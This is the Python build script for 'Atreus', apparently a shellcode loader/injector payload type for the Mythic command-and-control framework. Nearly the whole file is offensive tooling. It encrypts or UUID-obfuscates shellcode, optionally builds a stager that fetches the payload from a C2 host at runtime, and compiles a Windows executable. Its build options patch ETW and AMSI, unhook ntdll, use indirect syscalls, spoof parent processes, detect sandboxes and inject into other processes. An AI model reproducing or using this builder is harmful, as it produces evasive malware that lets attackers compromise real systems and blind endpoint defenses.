from mythic_container.PayloadBuilder import *
import sys
import os
import logging
import subprocess
import tempfile
import random
import string
import pathlib


def _rc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    x = j = 0
    out = []
    for b in data:
        x = (x + 1) & 0xFF
        j = (j + S[x]) & 0xFF
        S[x], S[j] = S[j], S[x]
        out.append(b ^ S[(S[x] + S[j]) & 0xFF])
    return bytes(out)


def _str_to_wchar_array(s: str) -> str:
    """Convert a string to a C wchar_t array literal: L'C',L':',...,L'\0'"""
    chars = [f"L'\\x{ord(c):04x}'" for c in s]
    chars.append("L'\\0'")
    return ", ".join(chars)


class Atreus(PayloadType):
    name = "atreus"
    file_extension = "exe"
    author = "@goultarde"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    wrapped_payloads = []
    supports_dynamic_loading = False
    mythic_encrypts = True
    build_parameters = [
        BuildParameter(
            name="encryption_type",
            parameter_type=BuildParameterType.ChooseOne,
            description="Payload encoding/encryption: stager = download payload at runtime (low entropy), uuid = UUID fuscation, rc4/xor = encrypted bytes, none = plaintext",
            choices=["stager", "uuid", "rc4", "xor", "none"],
            default_value="uuid",
        ),
        BuildParameter(
            name="encryption_key",
            parameter_type=BuildParameterType.String,
            description="Encryption key (leave empty for random 16-byte key)",
            default_value="",
            required=False,
        ),
        BuildParameter(
            name="mythic_host",
            parameter_type=BuildParameterType.String,
            description="Stager mode only: IP/hostname of the Mythic server (used to download the shellcode at runtime)",
            default_value="198.51.100.6",
            required=False,
        ),
        BuildParameter(
            name="target_process",
            parameter_type=BuildParameterType.String,
            description="Target process: full path for early_bird/hollow/thread_hijacking (e.g. C:\\Windows\\System32\\notepad.exe), process name for remote_thread (e.g. svchost.exe)",
            default_value="C:\\Windows\\System32\\notepad.exe",
        ),
        BuildParameter(
            name="ppid_spoof",
            parameter_type=BuildParameterType.Boolean,
            description="PPID spoof: make process appear as explorer.exe child",
            default_value=True,
        ),
        BuildParameter(
            name="use_unhook",
            parameter_type=BuildParameterType.Boolean,
            description="Remap ntdll .text from disk to remove EDR hooks before injection",
            default_value=True,
        ),
        BuildParameter(
            name="use_etw_patch",
            parameter_type=BuildParameterType.Boolean,
            description="Patch EtwEventWrite (xor eax,eax; ret) before injection",
            default_value=True,
        ),
        BuildParameter(
            name="use_amsi_patch",
            parameter_type=BuildParameterType.Boolean,
            description="Patch AmsiScanBuffer before injection",
            default_value=False,
        ),
        BuildParameter(
            name="use_sandbox_check",
            parameter_type=BuildParameterType.Boolean,
            description="Basic sandbox detection (uptime, RAM, CPU count, sleep skipping)",
            default_value=True,
        ),
        BuildParameter(
            name="injection_technique",
            parameter_type=BuildParameterType.ChooseOne,
            description="Injection technique: Early Bird APC (new suspended process), Thread Hijack (RIP redirect), Process Hollowing (unmap + RIP), or Remote Thread (NtCreateThreadEx in existing process - target_process must be a process name like svchost.exe)",
            choices=["self_injection", "fiber_injection", "module_stomping", "remote_injection", "thread_hijacking", "early_bird_apc", "process_hollowing", "local_map_inject", "remote_map_inject", "func_stomp"],
            default_value="early_bird_apc",
        ),
        BuildParameter(
            name="wipe_memory",
            parameter_type=BuildParameterType.Boolean,
            description="Zero payload in heap after injection",
            default_value=True,
        ),
        BuildParameter(
            name="use_hellshall",
            parameter_type=BuildParameterType.Boolean,
            description="HellsHall: SSN resolution + indirect syscalls bypass ntdll hooks (replaces ntdll remapping)",
            default_value=True,
        ),
        BuildParameter(
            name="debug_mode",
            parameter_type=BuildParameterType.Boolean,
            description="Debug mode: MessageBox at each injection step (do NOT use in production)",
            default_value=False,
        ),
    ]

    agent_code_path = pathlib.Path(__file__).parent.parent / "agent_code"
    agent_icon_path = pathlib.Path(__file__).parent.parent / "agent_icons" / "atreus.svg"

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Error)

        payload_bytes = self.wrapped_payload
        if not payload_bytes:
            resp.error_message = "No payload received from Kratos builder"
            return resp

        enc_type = (self.get_parameter("encryption_type") or "uuid").strip()
        enc_key_param    = (self.get_parameter("encryption_key") or "").strip()
        mythic_host_param = (self.get_parameter("mythic_host") or "198.51.100.6").strip()
        target_process   = (self.get_parameter("target_process") or "C:\\Windows\\System32\\notepad.exe").strip()
        ppid_spoof       = self.get_parameter("ppid_spoof") or False
        use_unhook       = self.get_parameter("use_unhook") or False
        use_etw_patch    = self.get_parameter("use_etw_patch") or False
        use_amsi_patch   = self.get_parameter("use_amsi_patch") or False
        use_sandbox      = self.get_parameter("use_sandbox_check") or False
        injection_technique = self.get_parameter("injection_technique") or "early_bird_apc"
        wipe_memory      = self.get_parameter("wipe_memory") or False
        use_hellshall    = self.get_parameter("use_hellshall") or False
        debug_mode       = self.get_parameter("debug_mode") or False

        # Generate key (unused for uuid mode)
        key_bytes = enc_key_param.encode() if enc_key_param else \
                    bytes(random.getrandbits(8) for _ in range(16))

        # Encode/encrypt payload
        orig_size = len(payload_bytes)
        if enc_type == "uuid":
            # Pad to multiple of 16
            padded = payload_bytes
            remainder = len(padded) % 16
            if remainder:
                padded = padded + bytes(16 - remainder)
            uuid_strings = []
            for i in range(0, len(padded), 16):
                c = padded[i:i+16]
                s = (f"{c[0]:02X}{c[1]:02X}{c[2]:02X}{c[3]:02X}-"
                     f"{c[4]:02X}{c[5]:02X}-"
                     f"{c[6]:02X}{c[7]:02X}-"
                     f"{c[8]:02X}{c[9]:02X}-"
                     f"{c[10]:02X}{c[11]:02X}{c[12]:02X}{c[13]:02X}{c[14]:02X}{c[15]:02X}")
                uuid_strings.append(f'"{s}"')
            payload_hex    = ", ".join(uuid_strings)
            uuid_count     = str(len(uuid_strings))
            payload_size   = str(orig_size)
            rc4_key_bytes  = "0x00"
            xor_key_bytes  = "0x00"
        elif enc_type == "rc4":
            encrypted = _rc4(key_bytes, payload_bytes)
            payload_hex    = ", ".join(f"0x{b:02x}" for b in encrypted)
            uuid_count     = "0"
            payload_size   = str(orig_size)
            rc4_key_bytes  = ", ".join(f"0x{b:02x}" for b in key_bytes)
            xor_key_bytes  = "0x00"
        elif enc_type == "xor":
            encrypted = bytes(payload_bytes[i] ^ key_bytes[i % len(key_bytes)]
                              for i in range(len(payload_bytes)))
            payload_hex    = ", ".join(f"0x{b:02x}" for b in encrypted)
            uuid_count     = "0"
            payload_size   = str(orig_size)
            rc4_key_bytes  = "0x00"
            xor_key_bytes  = ", ".join(f"0x{b:02x}" for b in key_bytes)
        elif enc_type == "stager":
            logging.error(f"[ATREUS-DEBUG] enc_type=stager detected, payload_size={orig_size}")
            # Stager: payload NOT embedded - registered in Mythic and downloaded at runtime
            payload_hex    = "0x00"  # inside #else branch, not compiled with USE_STAGER
            uuid_count     = "0"
            payload_size   = str(orig_size)
            rc4_key_bytes  = ", ".join(f"0x{b:02x}" for b in key_bytes)
            xor_key_bytes  = "0x00"
            stager_encrypted = _rc4(key_bytes, payload_bytes)
            logging.error(f"[ATREUS-DEBUG] stager RC4 key: {key_bytes.hex()}, encrypted size: {len(stager_encrypted)}")
        else:
            logging.error(f"[ATREUS-DEBUG] enc_type={enc_type} -> plaintext fallback")
            payload_hex    = ", ".join(f"0x{b:02x}" for b in payload_bytes)
            uuid_count     = "0"
            payload_size   = str(orig_size)
            rc4_key_bytes  = "0x00"
            xor_key_bytes  = "0x00"

        # Target process as wchar array (no string literal in binary)
        target_wchar = _str_to_wchar_array(target_process)

        # Read template
        template_path = self.agent_code_path / "Atreus_Main.cpp"
        if not template_path.exists():
            resp.error_message = f"Template not found: {template_path.absolute()}"
            return resp

        src = template_path.read_text()
        src = src.replace("%PAYLOAD%",          payload_hex)
        src = src.replace("%UUID_COUNT%",       uuid_count)
        src = src.replace("%PAYLOAD_SIZE%",     payload_size)
        src = src.replace("%RC4_KEY%",          rc4_key_bytes)
        src = src.replace("%XOR_KEY_BYTES%",    xor_key_bytes)
        src = src.replace("%TARGET_PROCESS_W%", target_wchar)

        # Stager: upload encrypted payload to Mythic, derive download URL automatically
        if enc_type == "stager":
            from mythic_container.MythicRPC import SendMythicRPCFileCreate, MythicRPCFileCreateMessage
            rpc_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                PayloadUUID=self.uuid,
                FileContents=stager_encrypted,
                Filename="kratos_stager.bin",
                DeleteAfterFetch=False,
                Comment="Atreus stager RC4-encrypted shellcode",
            ))
            if not rpc_resp.Success:
                resp.error_message = f"MythicRPC FileCreate failed: {rpc_resp.Error}"
                return resp
            file_id = rpc_resp.AgentFileId
            _mythic_host = mythic_host_param
            _mythic_port = 7443
            _stager_path = f"/direct/download/{file_id}"
            _xk = random.getrandbits(8)
            _henc = ", ".join(f"0x{b ^ _xk:02x}" for b in _mythic_host.encode('ascii'))
            _penc = ", ".join(f"0x{b ^ _xk:02x}" for b in _stager_path.encode('ascii'))
            logging.error(f"[ATREUS-DEBUG] stager file_id={file_id} host={_mythic_host} port={_mythic_port} path={_stager_path}")
            src = src.replace("%STAGER_HOST_ENC%", _henc)
            src = src.replace("%STAGER_PORT%",     str(_mythic_port))
            src = src.replace("%STAGER_PATH_ENC%", _penc)
            src = src.replace("%STAGER_XOR_KEY%",  f"0x{_xk:02x}")
        else:
            src = src.replace("%STAGER_HOST_ENC%", "0x00")
            src = src.replace("%STAGER_PORT%",     "9090")
            src = src.replace("%STAGER_PATH_ENC%", "0x00")
            src = src.replace("%STAGER_XOR_KEY%",  "0x00")
        logging.error(f"[ATREUS-DEBUG] enc_type={repr(enc_type)}")

        # Build defines
        defines = []
        if enc_type == "uuid":
            defines.append("-DUSE_UUID")
        elif enc_type == "rc4":
            defines.append("-DUSE_RC4")
        elif enc_type == "xor":
            defines.append("-DUSE_XOR")
        elif enc_type == "stager":
            defines.append("-DUSE_STAGER")
            logging.error("[ATREUS-DEBUG] -DUSE_STAGER added")
        if ppid_spoof:
            defines.append("-DUSE_PPID_SPOOF")
        if use_unhook:
            defines.append("-DUSE_UNHOOK")
        if use_etw_patch:
            defines.append("-DUSE_ETW_PATCH")
        if use_amsi_patch:
            defines.append("-DUSE_AMSI_PATCH")
        if use_sandbox:
            defines.append("-DUSE_SANDBOX_CHECK")
        if injection_technique == "thread_hijacking":
            defines.append("-DUSE_THREAD_HIJACK")
        elif injection_technique == "process_hollowing":
            defines.append("-DUSE_HOLLOW")
        elif injection_technique == "remote_injection":
            defines.append("-DUSE_REMOTE_THREAD")
        elif injection_technique == "self_injection":
            defines.append("-DUSE_SELF_INJECT")
        elif injection_technique == "fiber_injection":
            defines.append("-DUSE_FIBER_INJECT")
        elif injection_technique == "module_stomping":
            defines.append("-DUSE_MODULE_STOMP")
        elif injection_technique == "local_map_inject":
            defines.append("-DUSE_LOCAL_MAP_INJECT")
        elif injection_technique == "remote_map_inject":
            defines.append("-DUSE_REMOTE_MAP_INJECT")
        elif injection_technique == "func_stomp":
            defines.append("-DUSE_FUNC_STOMP")
        if wipe_memory:
            defines.append("-DUSE_WIPE")
        if use_hellshall:
            defines.append("-DUSE_HELLSHALL")

        extra_libs = ""
        if debug_mode:
            defines.append("-DATREUS_DEBUG")

        # DEBUG: log raw parameter value and final defines
        raw_inj = self.get_parameter("injection_technique")
        logging.error(f"[ATREUS-DEBUG] raw injection_technique = {repr(raw_inj)}")
        logging.error(f"[ATREUS-DEBUG] resolved injection_technique = {repr(injection_technique)}")
        logging.error(f"[ATREUS-DEBUG] defines = {defines}")

        with tempfile.TemporaryDirectory() as tmp:
            src_path  = os.path.join(tmp, "Atreus_Main.cpp")
            exe_path  = os.path.join(tmp, "Atreus.exe")
            stub_path = os.path.join(tmp, "syscall_stub_atreus.S")
            hg_path   = os.path.join(tmp, "hellshall.hpp")
            with open(src_path, "w") as f:
                f.write(src)

            # Copy HellsHall support files into tmp dir when needed
            if use_hellshall:
                import shutil
                shutil.copy(str(self.agent_code_path / "syscall_stub_atreus.S"), stub_path)
                shutil.copy(str(self.agent_code_path / "hellshall.hpp"), hg_path)

            if debug_mode:
                subsystem = "-mwindows"  # windowless + file logging to %TEMP%\atreus_debug.log
                opt_flags = "-O0 -g"     # no strip, debug symbols for crash analysis
            else:
                subsystem = "-mwindows -s"
                opt_flags = "-O2"

            extra_src = f" {stub_path}" if use_hellshall else ""
            cmd = (
                f"x86_64-w64-mingw32-g++ {src_path}{extra_src} -o {exe_path} "
                f"-std=c++17 {opt_flags} {subsystem} -lntdll -static "
                f"-fno-exceptions -fno-rtti -fno-ident -w "
                f"-Wl,--build-id=none "
                f"{' '.join(defines)} {extra_libs}"
            )
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = proc.communicate()

            if proc.returncode != 0:
                resp.error_message = (
                    f"Atreus compilation failed\n"
                    f"Command: {cmd}\n"
                    f"StdErr: {stderr.decode()}\n"
                    f"StdOut: {stdout.decode()}"
                )
                return resp

            # Scrub GCC version strings from .rdata (MinGW embeds them in static libs)
            with open(exe_path, "rb") as f:
                pe_bytes = bytearray(f.read())
            import re as _re
            for m in _re.finditer(rb'GCC: \([^)]+\)[^\x00]*\x00', pe_bytes):
                pe_bytes[m.start():m.end()] = b'\x00' * (m.end() - m.start())
            with open(exe_path, "wb") as f:
                f.write(pe_bytes)

            with open(exe_path, "rb") as f:
                resp.payload = f.read()
                resp.status  = BuildStatus.Success

                features = [f"UUID-fuscation" if enc_type == "uuid" else enc_type.upper()]
                if ppid_spoof:       features.append("PPID-spoof")
                if use_unhook:       features.append("unhook-ntdll")
                if use_etw_patch:    features.append("ETW-patch")
                if use_amsi_patch:   features.append("AMSI-patch")
                if use_sandbox:      features.append("sandbox-check")
                if injection_technique == "thread_hijacking":    features.append("thread-hijacking")
                elif injection_technique == "process_hollowing": features.append("process-hollowing")
                elif injection_technique == "remote_injection":  features.append("remote-injection")
                elif injection_technique == "self_injection":    features.append("self-injection")
                elif injection_technique == "fiber_injection":   features.append("fiber-injection")
                elif injection_technique == "module_stomping":   features.append("module-stomping")
                else:                                            features.append("early-bird-apc")
                if wipe_memory:      features.append("wipe")
                if debug_mode:       features.append("DEBUG")
                if enc_type == "stager":
                    resp.message = (
                        f"Atreus [{', '.join(features)}] -> {target_process}\n"
                        f"STAGER: https://{_mythic_host}:{_mythic_port}{_stager_path}\n"
                        f"RC4 key (hex): {key_bytes.hex()}\n"
                        f"Encrypted payload size: {len(stager_encrypted)} bytes (registered in Mythic)\n"
                        f"[DBG] defines={' '.join(defines)}"
                    )
                else:
                    resp.message = (
                        f"Atreus [{', '.join(features)}] -> {target_process}\n"
                        f"[DBG] raw_param={repr(raw_inj)} resolved={repr(injection_technique)}\n"
                        f"[DBG] defines={' '.join(defines)}"
                    )

        return resp
